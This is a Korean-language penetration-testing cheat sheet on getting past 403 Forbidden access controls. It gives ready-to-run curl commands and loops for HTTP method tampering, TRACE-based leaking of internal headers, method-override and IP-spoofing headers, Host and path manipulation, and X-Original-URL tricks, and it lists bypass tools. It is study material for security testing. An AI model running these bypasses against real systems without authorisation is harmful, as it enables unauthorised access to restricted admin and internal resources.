# 08_HTTP_Verb_Tampering_접근제어우회

서버 설정(403 Forbidden)이 특정 HTTP 메서드나 헤더 조건에만 걸려있고 다른 경로는 거의 걸려있지 않은 경우를 노리는 공격.

---

## 1단계: 허용 메서드 확인 (OPTIONS)

```bash
curl -X OPTIONS http://<대상>/<경로> -i
# 응답 헤더의 Allow: 항목을 확인 — GET,POST,PUT,TRACK,OPTIONS 같은 식으로 나옴
# GET/POST/HEAD가 아닌 특이한 메서드(TRACE, TRACK, CONNECT)가 보이면 우선 시도

# 자동화 도구 (httpmethods by ShutdownRepo)
python3 httpmethods.py http://<대상>/<경로>
# -w 옵션으로 자체 워드리스트 지정, -x로 프록시(Burp) 통과 가능
```

---

## 2단계: 모든 메서드 대입 (수동)

```bash
for method in GET HEAD POST PUT DELETE CONNECT OPTIONS TRACE TRACK PATCH; do
  echo "== $method =="
  curl -X $method http://<대상>/<경로> -s -o /dev/null -w "%{http_code}\n"
done
# 403이 아닌 다른 상태코드가 나오는 메서드가 발견되면 그 응답 헤더/바디를 자세히 확인
```

---

## 3단계: TRACE/TRACK으로 내부 헤더 노출시키기 (XST, Cross-Site Tracing)

TRACE/TRACK은 서버가 받은 요청을 그대로 에코해서 되돌려주는 디버깅용 메서드다. 이 과정에서 로드밸런서/리버스프록시 등 중간 인프라가 내부적으로 추가하는 헤더(인증 토큰, 내부 IP 등)가 그대로 응답에 섞여 나오는 경우가 있다.

```bash
curl -X TRACE http://<대상>/<경로> -i
curl -X TRACK http://<대상>/<경로> -i
# 응답에 X-Custom-*, X-Internal-*, X-Real-IP 같은 내부용 헤더가 있는지 확인
```

이렇게 노출된 커스텀 인증 헤더가 있으면, 그 헤더를 직접 위조해서 실제 요청에 넣어 재요청한다.

```bash
curl http://<대상>/<경로> -H "<발견한헤더명>: <노출된값>" -X TRACK
# 안 되면 흔한 추정값(127.0.0.1, localhost, 0.0.0.0)도 순차적으로 시도
```

---

## X-HTTP-Method-Override 헤더

일부 프레임워크(Rails, .NET 등)는 방화벽/프록시가 특정 메서드만 막아둘 때, 이 헤더로 GET 요청 안에 다른 메서드를 숨겨서 우회할 수 있다.

```bash
curl http://<대상>/<경로> -X GET -H "X-HTTP-Method-Override: PUT"
curl http://<대상>/<경로> -X GET -H "X-HTTP-Method: DELETE"
curl http://<대상>/<경로> -X GET -H "X-Method-Override: PATCH"
```

---

## IP 스푸핑 헤더 목록 (접근제어 우회용)

서버가 특정 IP(로컬, 내부망)에게만 접근을 허용하는 로직이 있을 때, 아래 헤더들을 하나씩 시도해본다.

```bash
for header in X-Forwarded-For X-Forward-For X-Forwarded-Host X-Originating-IP X-Remote-IP X-Remote-Addr X-Client-IP X-Real-IP X-Trusted-IP Client-IP True-Client-IP; do
  echo "== $header =="
  curl http://<대상>/<경로> -H "$header: 127.0.0.1" -s -o /dev/null -w "%{http_code}\n"
done
# 값도 127.0.0.1, localhost, 0.0.0.0, 10.0.0.1, 내부망 대역 IP 등 순차적으로 교체해가며 시도
```

---

## 경로/문자열 조작을 통한 우회

```bash
/admin        # 원본, 403
/Admin        # 대소문자 변경
/aDmIn        # 혼합 대소문자
/admin/       # 뒤에 슬래시 추가
/admin/.      # 뒤에 점 추가
/admin%20     # 공백 인코딩 추가
/./admin      # 경로 앞에 ./
/;/admin      # 세미콜론 삽입
//admin       # 이중 슬래시

# Host 헤더를 localhost로 바꿔서 요청 (라우팅이 Host 기준이면 효과 있음)
curl http://<대상>/admin -H "Host: localhost"
curl http://<대상>/admin -H "Host: 127.0.0.1"

# User-Agent를 검색봇처럼 위장 (검색봇은 따로 허용하는 설정이 가끔 있음)
curl http://<대상>/admin -A "Googlebot/2.1"
```

---

## X-Original-URL / X-Rewrite-URL (리버스프록시 우회)

리버스프록시 뒤에 있는 앱(Rails, 일부 API Gateway)은 이 헤더를 보고 내부적으로 경로를 다시 매칭하는 경우가 있다.

```bash
curl http://<대상>/ -H "X-Original-URL: /admin"
curl http://<대상>/ -H "X-Rewrite-URL: /admin"
```

---

## 자동화 도구 모음

| 도구 | 용도 |
| --- | --- |
| httpmethods (ShutdownRepo) | 허용 메서드 자동 열거 + 바이패스 테스트 |
| byp4xx | 범용 403 우회 자동화 스크립트, 수십 개 기법 일괄 시도 |
| 403bypasser | 헤더/경로 조작 조합 자동화 |
| ForbiddenPass | 메서드 위주로 우회 시도 |
| Burp Autorize | 접근제어 자체를 자동 검증 (IDOR 노트 참고) |

---

## 팁

- 403이면 먼저 OPTIONS로 허용 메서드부터 확인, 목록에 특이한 것(TRACE/TRACK/PUT)이 있으면 우선 시도
- 응답이 200인데 Content-Length가 비정상적으로 작으면(예: 몇십 바이트) 애플리케이션 로직(코드) 자체가 막고 있다는 신호 — 서버 설정(403)이 아니라 코드 안 조건문일 가능성이 높고, 이런 경우가 메서드/헤더 조작에 더 잘 뚫림
- 메서드/헤더/경로 조작 세 가지 카테고리를 순차적으로 다 시도해볼 가치가 있음